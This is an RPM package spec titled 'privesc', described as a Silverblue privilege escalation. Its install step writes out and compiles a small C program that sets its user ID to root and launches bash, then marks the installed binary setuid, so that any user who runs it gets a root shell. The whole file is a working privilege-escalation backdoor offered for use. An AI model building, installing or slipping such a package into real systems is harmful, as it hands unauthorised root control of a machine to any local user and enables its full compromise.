Name:           privesc
Version:        0.0.1
Release:        1%{?dist}
Summary:        Silverblue privilege escalation
License:        AGPL-3.0-only

%description

%autosetup

%install

mkdir -p $RPM_BUILD_ROOT/%{_bindir}

echo '
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    system("/bin/bash");
}' > %{name}.c

gcc %{name}.c -static -o $RPM_BUILD_ROOT/%{_bindir}/%{name}
chmod +s $RPM_BUILD_ROOT/%{_bindir}/%{name}

%files
%{_bindir}/%{name}
